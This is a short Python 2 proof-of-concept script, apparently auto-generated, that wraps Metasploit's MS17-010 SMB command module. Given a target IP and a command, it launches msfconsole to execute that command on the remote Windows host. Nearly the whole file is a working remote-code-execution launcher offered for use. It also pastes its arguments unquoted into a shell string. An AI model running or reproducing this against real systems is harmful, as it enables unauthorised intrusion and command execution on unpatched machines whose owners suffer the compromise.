#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# ms17_010_msf_psexec.py                                                                                    #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Auto generated by msf_gen.py                                                                              #
#                                                                                                           #
#############################################################################################################

import signal
import sys
import os

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def exploit():

   command = """echo y | msfconsole -q -x "auxiliary/admin/smb/ms17_010_command;set RHOSTS %s;set COMMAND %s;run;quit" 2>/dev/null""" % (HOST, COMMAND)
   os.system(command)

def print_usage():
   print("Usage: %s <ip> <command>" % (sys.argv[0]))
   print("EXAMPLE: ms17_010_msf_psexec.py '127.0.0.1' whoami\n")
   sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 3:
       print_usage()

    HOST = sys.argv[1]
    COMMAND = sys.argv[2]

    if os.path.isfile('/usr/bin/msfconsole') is False:
       print('ERROR: Please install metasploit for run this PoC.')
       sys.exit(1)

    exploit()
